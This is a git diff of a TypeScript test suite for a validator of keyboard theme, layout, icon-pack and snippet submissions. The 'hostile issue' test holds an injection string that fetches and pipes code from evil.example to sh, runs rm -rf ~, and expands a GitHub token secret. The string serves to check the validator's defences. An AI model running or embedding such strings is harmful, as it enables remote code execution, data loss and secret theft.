@@ -8,6 +8,7 @@ import { ALICE, BOB, body, evaluate, fixture, meta, tree, vectors } from './help
 const THEME = vectors()[1]!.json;
 const LAYOUT = vectors()[2]!.json;
 const failing = (r: { checks: { title: string; ok: boolean }[] }) => r.checks.filter((c) => !c.ok).map((c) => c.title);
+const json = (bytes: Uint8Array | null) => JSON.parse(Buffer.from(bytes!).toString('utf8'));
 
 describe('a good theme', () => {
 	it('passes and gets its id from the name', async () => {
@@ -18,7 +19,7 @@ describe('a good theme', () => {
 		assert.equal(r.id, 'midnight-typewriter');
 		assert.equal(r.isUpdate, false);
 		assert.deepEqual(r.tags, ['dark', 'retro', 'mono']);
-		assert.deepEqual(JSON.parse(r.payload!), JSON.parse(THEME));
+		assert.deepEqual(json(r.payload), JSON.parse(THEME));
 	});
 
 	it('takes pasted JSON as well as the encoded string', async () => {
@@ -57,7 +58,7 @@ describe('a layout', () => {
 		assert.deepEqual(failing(r), []);
 		assert.equal(r.type, 'layout');
 		assert.equal(r.id, 'edit-row-qwerty');
-		const env = JSON.parse(r.payload!);
+		const env = json(r.payload);
 		assert.equal(env.format, 'wmkeyboard-layout');
 		assert.equal(env.version, 1);
 		assert.equal(env.layout.id, 'edit-row-qwerty');
@@ -75,7 +76,7 @@ describe('a layout', () => {
 		withTheme.layout.layers.letters.themeId = 'custom_9';
 		const r = await evaluate(body({ name: 'Edit row', payload: encodePayload(JSON.stringify(withTheme)) }, 'Layout'), { type: 'layout' });
 		assert.equal(r.ok, true);
-		const env = JSON.parse(r.payload!);
+		const env = json(r.payload);
 		assert.equal(env.layout.themeId, undefined);
 		assert.equal(env.layout.layers.letters.themeId, undefined);
 		assert.equal(env.layout.id, JSON.parse(LAYOUT).layout.id);
@@ -143,7 +144,7 @@ describe('a hostile issue', () => {
 		const r = await evaluate(fixture('hostile.md'));
 		assert.equal(r.ok, false);
 		assert.equal(r.payload, null);
-		assert.match(r.checks.find((c) => c.title === 'Payload')!.detail!, /unpacks to more than 16 MB/);
+		assert.match(r.checks.find((c) => c.title === 'Payload')!.detail!, /unpacks to more than 24 MB/);
 		assert.equal(r.name, '$(curl -s https://evil.example/x | sh) `rm -rf ~` ${{ secrets.GITHUB_TOKEN }}');
 		assert.ok(r.id === null || /^[a-z0-9-]+$/.test(r.id));
 	});
@@ -168,5 +169,40 @@ describe('a hostile issue', () => {
 		const r = await evaluate(body({ name: 'n'.repeat(61), description: 'd'.repeat(501), payload: encodePayload(THEME) }));
 		assert.ok(failing(r).includes('Name'));
 		assert.ok(failing(r).includes('Description'));
+	});
+});
+
+describe('packs and snippets', () => {
+	const icons = zipSync({
+		'pack.json': strToU8(JSON.stringify({ format: 'wmkeyboard-icons', version: 1, pack: { id: 'r', name: 'Rounded', slots: ['tool.clipboard'] } })),
+		'icons/tool.clipboard.svg': strToU8('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"/>'),
+	});
+	const attached = (bytes: Uint8Array) => (async () => new Response(bytes as unknown as BodyInit)) as typeof fetch;
+
+	it('publishes an attached icon pack byte for byte', async () => {
+		const r = await evaluate(body({ name: 'Rounded', payload: '[rounded.zip](https://github.com/user-attachments/files/7/rounded.zip)' }, 'Icon pack'), { type: 'icon_pack', fetchImpl: attached(icons) });
+		assert.deepEqual(failing(r), []);
+		assert.equal(r.type, 'icon_pack');
+		assert.equal(r.id, 'rounded');
+		assert.deepEqual([...r.payload!], [...icons]);
+	});
+
+	it('takes a small pack as encoded text too', async () => {
+		const r = await evaluate(body({ name: 'Rounded', payload: encodePayload(icons) }, 'Icon pack'), { type: 'icon_pack' });
+		assert.equal(r.ok, true);
+	});
+
+	it('refuses a pack sent with another form, by the right name', async () => {
+		const r = await evaluate(body({ name: 'Rounded', payload: encodePayload(icons) }), { type: 'theme' });
+		assert.deepEqual(failing(r), ['Form type']);
+		assert.match(r.checks.find((c) => c.title === 'Form type')!.detail!, /an? icon pack, sent with the theme form/);
+	});
+
+	it('takes pasted snippets', async () => {
+		const snippets = JSON.stringify({ format: 'wmkeyboard-snippets', version: 2, snippets: [{ id: 1, label: 'hi', text: 'Hello there' }] });
+		const r = await evaluate(body({ name: 'Greetings', payload: snippets }, 'Snippets'), { type: 'snippets' });
+		assert.deepEqual(failing(r), []);
+		assert.equal(r.type, 'snippets');
+		assert.equal(json(r.payload).snippets[0].text, 'Hello there');
 	});
 });
